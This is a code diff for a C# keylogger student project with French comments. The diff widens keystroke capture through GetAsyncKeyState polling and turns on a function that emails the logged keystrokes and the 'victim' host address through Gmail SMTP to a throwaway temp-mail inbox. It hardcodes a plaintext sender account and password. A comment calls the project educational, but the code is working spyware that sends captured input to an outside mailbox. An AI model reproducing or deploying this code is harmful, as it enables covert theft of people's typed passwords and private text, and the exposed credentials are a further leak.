@@ -9,6 +9,7 @@ using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Net.Mail;
 using System.Threading;
+using System.Windows.Input;
 
 namespace ProjetKeyLogger
 {
@@ -56,25 +57,40 @@ namespace ProjetKeyLogger
 
             //capture les frappes de touches et les afficher dans la console
             bool majuscule = false;
+
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                 Thread.Sleep(5); //nombre en miliseconde
 
+                //booleen qui autorise ou non la saisie du clavier (On l'autorise pour l'instant)
+                Boolean autorise_saisie = true;
+
+                //liste des touches pour lesquelles la saisie est intérrompue
+                //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
+                int[] list_non_accepte = new int[] { 17 ,18 ,91 };
+
+                //le tableau des touches d'interruptions de la capture est parcouru
+                for (int i = 0; i < list_non_accepte.Length; i++)
+                {
+                    //Si la touche est enfoncée on suspend l'autorisation de saisie du texte
+                    int statut_cle = GetAsyncKeyState(list_non_accepte[i]);
+                    if (statut_cle == 32769) { autorise_saisie = false;  }
+                }
 
                 //verification de l'état de chaque touche (up ou down)
                 //avec une table des code ASCII, les codes de clavier vont de 0 à 127
                 //on va vérifier ces 128 touches
                 
-                for (int codeASCII = 0; codeASCII < 128; codeASCII++)
+                for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
+                    
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                     // on caste le nombre ascii en char
-                   
-                    if (statut_cle == 32769)
-                    {                        
+                    if (statut_cle == 32769 && autorise_saisie == true)
+                    {
                         switch (codeASCII)
                         {
                             
@@ -82,7 +98,7 @@ namespace ProjetKeyLogger
                             case 13:
                                 //Sinon on peut faire un console.writeline tout simplement ?
                                 //On ajoute l'enregistrement a la collection
-                                collection_enregistrement.ajouter(enregistrement);
+                                collection_enregistrement.ajouterNew(enregistrement);
 
                                 //On réinitialise l'enregistrement
                                 enregistrement = new Enregistrement();
@@ -99,7 +115,7 @@ namespace ProjetKeyLogger
                                                                    
                                 break;
                             case 8:
-                                // enregistrement.effacerContenu();
+                                enregistrement.effacerContenu();
                                 break;
 
                             case 110:
@@ -184,7 +200,7 @@ namespace ProjetKeyLogger
                             collection_enregistrement = new CollectionEnregistrement();
 
                             //Puis on envoie un mail
-
+                            envoieMail();
                         }
 
 
@@ -194,11 +210,11 @@ namespace ProjetKeyLogger
         }
 
 
-        //Envoyer le txt pr mail ?
+        //Envoyer du fichier par mail
         private void envoieMail()
         {
-            string Chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string Chemin_Txt = Chemin_Dossier + @"\CaptureClavier.txt";
+            string Chemin_Dossier = "../../../Fichier XML";
+            string Chemin_Txt = Chemin_Dossier + @"/TestXML.xml";
 
             //recuperation du contenu du fichier
             string Contenu = File.ReadAllText(Chemin_Txt);
@@ -210,8 +226,6 @@ namespace ProjetKeyLogger
             //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
             var Nom_Ordinateur = Dns.GetHostEntry(Dns.GetHostName());
 
-            //faire si jamais l'ordi a plusieurs adresse ip ?
-
             //Création du corps du mail
             //Utiliser les autres fonctions de charlie 
             string Corps_Mail = "date :" + Date_Mail + "\n Adresse ip de la victime :" + Nom_Ordinateur + "\n";
@@ -222,23 +236,26 @@ namespace ProjetKeyLogger
             SmtpClient Client = new SmtpClient("smtp.gmail.com", 587);
             MailMessage Message_Mail = new MailMessage();
 
-            //definition de l'adresse source à mettre entre les guillemets
-            Message_Mail.From = new MailAddress("xxx@gmail.com");
+            //definition de l'adresse mail qui envoie
+            //Cette adresse à été crée spécialement pour ce projet à but non lucratif et seulement éducatif.
+            Message_Mail.From = new MailAddress("jordan.leeon2@gmail.com");
 
             //definition de l'adresse de destination 
-            Message_Mail.To.Add("xxx@gmail.com");
+            //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
+            //site de création du mail : temp-mail.org
+            Message_Mail.To.Add("jejarer632@nonicamy.com");
 
             //defition de l'objet du mail
             Message_Mail.Subject = Objet_Mail;
 
-            //En rapport avec l'authentification à l'adresse mail mais vérifier pq on met à false
+            //En true, elle utilise les identifiant de l'utilisateur actuel. En false, elle utilise les valeurs que nous lui donnons plus bas
             Client.UseDefaultCredentials = false;
 
             //utilisation du protocole SSL (Secure sockets Layer) pour transporter de manière sécurisée
             Client.EnableSsl = true;
 
-            //remplacer les guillemets avec les vraies valeurs
-            Client.Credentials = new System.Net.NetworkCredential("adresse", "le mot de passe de la'dresse");
+            //UseDefaultCredentials étant déclaré en False, il faut lui fournier les inforamtions de connexion 
+            Client.Credentials = new System.Net.NetworkCredential("jordan.leeon2@gmail.com", "projetc#2020");
 
             //définition du corps du mail
             Message_Mail.Body = Corps_Mail;
